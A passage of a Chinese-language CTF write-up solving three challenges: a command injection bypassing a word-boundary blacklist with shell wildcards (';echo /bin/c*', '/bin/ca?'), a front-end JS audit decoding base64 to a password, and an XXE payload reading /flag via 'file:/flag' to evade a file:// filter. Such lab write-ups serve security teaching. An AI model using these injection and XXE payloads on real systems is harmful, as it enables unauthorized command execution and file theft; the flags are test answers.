;echo /bin/c*

    * 也会展开成路径，等于“用 echo 当 ls 用”。

    另外 ? 可以连续用：/fla?? 表示“fla + 两个字符”。

    这题踩的坑

    ① 只想着变形命令名，忘了参数也被拦

    cat 绕过了，但 /flag 里还有 flag，一样被 \b 拦住。两个都要变。

    ② 用 $(...) 或反引号

    这两个都被拉黑了。没有命令替换，只能靠通配符让 shell 自己展开。

    ③ 不加 ;

    注入点前面已经有命令了，不加分隔符，你的 /bin/ca? 会被当成上一条命令的参数传进去，什么都不会发生。

    ④ 以为 \b 是“包含”

    \b 是词边界。/bin/ca? 不含完整单词 cat，所以能过；如果黑名单写的是 strpos（子串匹配），这招就废了。判断过滤方式，决定了能不能用通配符。

    save_nailong — 六道门后面，钥匙写在 game.js 里

    题目类型：前端代码审计 — 全局函数 + 被 base64 藏起来的跳转参数

    Flag：MYCTF{n1l0ng_r3scu3d_1n_th3_fr0nt3nd}

    题目概述

    剧情给了三句关键信息：

    值班表上留了一行字：「深渊·加班之神」，六道门，它在最后一道后面。
你只有 3 分钟，一把剑，和十点伤害。

    “六道门”“最后一道后面”——暗示这游戏本身是障眼法，答案在代码里，不在游戏里。

    解题过程

    Step 1：先正常玩一局，看有没有网络请求

    F12 打开网络面板打一局，结果很干净：

    只有 game.js
攻击的时候没有任何请求

    Burp 也抓不到东西——说明这个游戏完全在前端跑，没有任何后端交互。

    那就说明：flag 不在后端，在 JS 里。

    Step 2：看 game.js（先解决乱码）

    直接打开 game.js，中文全是乱码。

    原因：服务器返回的 Content-Type 里没带 charset，浏览器就按系统默认编码（GBK）去解 UTF-8 的文件。

    三种查看方式，任选：

    # ① 下下来，按 UTF-8 打开
curl.exe -o game.js "http://目标/game.js"

# ② 直接转换输出
curl.exe -s "http://目标/game.js" | python -c "import sys;sys.stdout.write(sys.stdin.buffer.read().decode('utf-8'))"

# ③ DevTools → 调试器（Sources），它自己会按 UTF-8 显示

    第 ③ 种最省事——浏览器开发者工具里的源码视图不受响应头影响。

    Step 3：拉到最下面

    文件头部是模块说明，写着“13 本地验收残留（考点，勿删）”——作者自己把考点标出来了。

    直接拉到尾部，看到这段：

    var SAVE_TAG = ['bjFsMG5n', 'X2IzYXNy', 'XzIwMjY='];

function devGate() {
  location.href = 'nailong.php?pass=' + SAVE_TAG.map(atob).join('');
}
window.devGate = devGate;

    三件事：

    ① SAVE_TAG 三段 base64，map(atob) 解码后 join 起来
② devGate() 拼成 nailong.php?pass=xxx 并跳转
③ window.devGate = devGate —— 这个函数被显式挂到了全局

    Step 4：解码，或者直接调它

    手动解码：

    bjFsMG5n   →  n1l0ng
X2IzYXNy   →  _b3asr
XzIwMjY=   →  _2026

    拼起来：

    n1l0ng_b3asr_2026

    于是访问：

    /nailong.php?pass=n1l0ng_b3asr_2026

    更快的办法——直接在控制台敲：

    devGate()

    因为 window.devGate = devGate;，它是全局的。

    跳转过去，拿到：

    MYCTF{n1l0ng_r3scu3d_1n_th3_fr0nt3nd}

    Step 5：为什么只有 devGate 能直接调

    整个 game.js 包在一个立即执行函数里：

    (function () {
  'use strict';
  var SAVE_TAG = [...];
  var state = {...};
  function devGate() {...}
  window.devGate = devGate;   // ← 唯一主动暴露的
})();

    IIFE 的意思是“函数定义完立刻调用”——里面的所有变量和函数都是私有的，外部拿不到。

    只有作者用 window.xxx = ... 显式挂上去的，才会变成全局。

    所以：

    devGate        ✅ 能用（被挂到 window）
SAVE_TAG       ❌ 用不了（私有）
state          ❌ 用不了（私有）

    Step 6：另一种玩法——改伤害（打不死，但方法值得学）

    代码里初始伤害是 10 点，boss 血很厚。想改 state.atk = 999999，但 state 是私有的，控制台直接赋值会报 not defined。

    解决办法：打断点。

    ① DevTools → 调试器（Sources）→ 在 attack 相关的函数里点行号打断点
② 点一次攻击，代码停住
③ 此时在 Console 里执行：
   state.atk = 999999

    为什么突然就能改了：断点停住时，执行上下文就在那个函数内部，Console 用的是当前作用域的上下文——所以能看到并改写 state。**

    可惜这条路走不通：把 boss 打死什么都不发生，没有 flag。这游戏是纯前端演出，通关不代表什么。

    关键点 说明
    浏览器里抓不到包 游戏全在前端跑，flag 只能从 JS 里找
    中文乱码 响应头没带 charset，浏览器按 GBK 猜；用 DevTools 或存下来按 UTF-8 看
    SAVE_TAG 三段 base64，map(atob).join('') 拼成密码
    全局函数 window.devGate = devGate 是唯一暴露到全局的入口
    IIFE 作用域 函数内变量默认私有，外部访问不到
    断点改私有变量 断点命中时 Console 用函数作用域，可读写局部变量
    打死 boss 没用 通关是演出，flag 在 nailong.php?pass= 后面
    完整操作 
    // 方式一：控制台直接调
devGate()

// 方式二：手动拼 URL
// n1l0ng + _b3asr + _2026 = n1l0ng_b3asr_2026
// 访问 /nailong.php?pass=n1l0ng_b3asr_2026
    这题踩的坑

    ① 一直在玩游戏

    这题的“游戏”是壳。六道门、三分钟、十点伤害——全是干扰项。

    ② 看到乱码就跳过

    乱码不是文件坏了，是编码判断错了。换一个查看方式就能读到中文提示。

    ③ 想在控制台直接改 state

    IIFE 里的 var 外部拿不到。必须靠断点进入作用域，或者找作者特意暴露的全局变量。

    ④ 以为打死 boss 有奖励

    这条路的收益是零。看懂“谁是全局的”比打赢重要。

    海棠诗社·诗笺夹带 — 誊录官一字不改，那就把 flag 塞进诗里

    题目类型：XXE（XML 外部实体注入）— 绕过 file:// 过滤

    Flag：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}

    题目概述

    题目背景写得很讲究：

    诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
听新闻社中那面小旗，就压在誊录官的案头（/flag）。

    “笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会原样解析并回显你提交的 XML。

    而那面小旗（flag）就在它案头，也就是 /flag 文件。

    所以思路很清楚：让 XML 解析器自己去读 /flag，再把内容抄给我。

    解题过程

    Step 1：先看 JS，找到提交入口

    页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：

    try {
  const r = await fetch('/tengchao', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: document.getElementById('x').value
  })

    三件事一眼看清：

    接口      POST /tengchao
类型      application/xml
请求体    输入框 #x 里的全部内容，原样提交

    也就是说：输入框里写什么 XML，服务器就拿什么去解析。

    Step 2：先确认后端语言（这一步很重要）

    我第一反应是 PHP 环境，于是去试 php://filter。

    结果报错里的堆栈信息显示是Java。

    这一步的价值：

    报错暴露语言 → 决定用哪套绕过思路
PHP  的伪协议        php://filter、php://input
Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设

    很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于解析器是谁。

    Step 3：file:// 被过滤，但 Java 不认这个死理

    直接写 file:///flag，被拦了——代码里过滤了 file:// 这个字符串。

    但 Java 的 XML 解析器在解析 SYSTEM 后面的值时，是按 URI 处理的，对斜杠数量并不敏感：

    SYSTEM "file:///flag"    ← 被过滤
SYSTEM "file:/flag"      ← 只有一个斜杠，能过
SYSTEM "/flag"           ← 干脆不带协议，也能过（当作绝对路径）

    所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。它以为外部实体只有 file:// 一种形态。

    Step 4：写 payload

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>

    三部分缺一不可：

    ① <!DOCTYPE ... [ <!ENTITY x SYSTEM "file:/flag"> ]>
   在 DTD 里声明一个实体 x，内容来自 file:/flag

② <题名>&x;</题名>
   在正文里**引用**它 —— 不引用，解析器根本不会去读文件

③ 保留原有的结构
   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显

    最容易漏的是第 ②：只声明实体、不引用，服务器什么都不会给你。**

    Step 5：提交，读结果

    把整段 XML 填进输入框，点提交。

    “誊抄入册”那块原样回显了：

    题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
落款：
出浴太真冰作影
捧心西子玉为魂

    因为 &x; 在解析时被替换成了 /flag 文件的内容。

    关键点 说明
    入口 POST /tengchao，Content-Type: application/xml，body 完全可控
    判断语言 php://filter 报错 → 堆栈显示 Java
    Java 的宽松 SYSTEM 的值按 URI 解析，file:/、/flag 都能用
    过滤的误判 只过滤了 file:// 这个字符串，没想到还有别的写法
    XXE 三要素 声明实体 → 引用实体 → 保持原结构走到回显
    文件路径 /flag（题目描述里直接给了）
    完整 payload 
    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 诗筏 [ <!ENTITY x SYSTEM "file:/flag"> ]>
<诗筏>
  <题名>&x;</题名>
  <落款></落款>
  <句>出浴太真冰作影</句>
  <句>捧心西子玉为魂</句>
</诗筏>
    这题踩的坑

    ① 只声明实体，不在正文引用

    <!ENTITY x SYSTEM "..."> 只是“登记”，解析器不会主动去读。必须在正文里写 &x; 才会触发读取和替换。

    ② 被 file:// 拦住就放弃

    过滤的是字符串，不是语义。file:/、file:、直接写绝对路径，都能达到同一个效果。

    ③ 没先判断后端语言

    PHP 的 php://filter 在 Java 里当然报错。报错本身就是信息——它告诉你该换哪一套思路。

    ④ 改了 XML 结构

    服务器的模板要求特定标签（<题名>、<句>），结构改坏就走不到回显那一步，哪怕实体读到了也没用。
